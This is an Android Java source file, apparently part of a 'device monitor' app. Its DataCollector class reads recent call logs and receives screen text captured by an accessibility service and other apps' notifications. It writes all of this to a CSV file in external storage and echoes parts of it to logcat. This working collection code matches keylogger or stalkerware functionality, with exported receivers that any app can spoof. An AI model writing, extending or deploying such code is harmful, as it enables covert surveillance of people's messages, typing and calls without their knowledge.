package com.devicemonitor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.util.Log;
import java.io.File;
import java.io.FileWriter;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class DataCollector {
    private static final String TAG = "DataCollector";
    private static final String LOG_FILE = "devicemonitor_log.csv";
    private Context context;
    private boolean initialized = false;

    public DataCollector(Context context) {
        this.context = context;
    }

    public void init() {
        if (initialized) return;
        initialized = true;

        // Register for captured text from AccessibilityService
        IntentFilter textFilter = new IntentFilter("com.devicemonitor.TEXT_CAPTURED");
        context.registerReceiver(textReceiver, textFilter, Context.RECEIVER_EXPORTED);

        // Register for captured notifications
        IntentFilter notifFilter = new IntentFilter("com.devicemonitor.NOTIFICATION_CAPTURED");
        context.registerReceiver(notifReceiver, notifFilter, Context.RECEIVER_EXPORTED);

        Log.d(TAG, "DataCollector initialized");
    }

    public void collectCallLogs() {
        try {
            String[] projection = {
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DURATION,
                CallLog.Calls.DATE
            };

            Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI, projection, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 50"
            );

            if (cursor == null) return;

            StringBuilder sb = new StringBuilder();
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);

            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                long duration = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION));
                long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));

                String typeStr;
                switch (type) {
                    case CallLog.Calls.INCOMING_TYPE: typeStr = "INCOMING"; break;
                    case CallLog.Calls.OUTGOING_TYPE: typeStr = "OUTGOING"; break;
                    case CallLog.Calls.MISSED_TYPE: typeStr = "MISSED"; break;
                    default: typeStr = "UNKNOWN";
                }

                sb.append(sdf.format(new Date(date)))
                  .append(",").append(number)
                  .append(",").append(typeStr)
                  .append(",").append(duration)
                  .append("\n");
            }
            cursor.close();

            if (sb.length() > 0) {
                appendToLog("=== CALL LOGS ===\n" + sb.toString());
            }
        } catch (SecurityException e) {
            Log.e(TAG, "No call log permission", e);
        }
    }

    private void appendToLog(String data) {
        try {
            File dir = new File(context.getExternalFilesDir(null), "logs");
            if (!dir.exists()) dir.mkdirs();
            File f = new File(dir, LOG_FILE);
            FileWriter fw = new FileWriter(f, true);
            PrintWriter pw = new PrintWriter(fw);
            pw.print(data);
            pw.flush();
            pw.close();
            Log.d(TAG, "Logged: " + data.substring(0, Math.min(100, data.length())));
        } catch (Exception e) {
            Log.e(TAG, "Failed to write log", e);
        }
    }

    private final BroadcastReceiver textReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String source = intent.getStringExtra("source");
            String text = intent.getStringExtra("text");
            if (text != null && !text.isEmpty()) {
                appendToLog("[ACCESSIBILITY][" + source + "] " + text + "\n");
            }
        }
    };

    private final BroadcastReceiver notifReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String pkg = intent.getStringExtra("package");
            String title = intent.getStringExtra("title");
            String text = intent.getStringExtra("text");
            appendToLog("[NOTIFICATION][" + pkg + "] Title: " + title + " | Text: " + text + "\n");
        }
    };
}
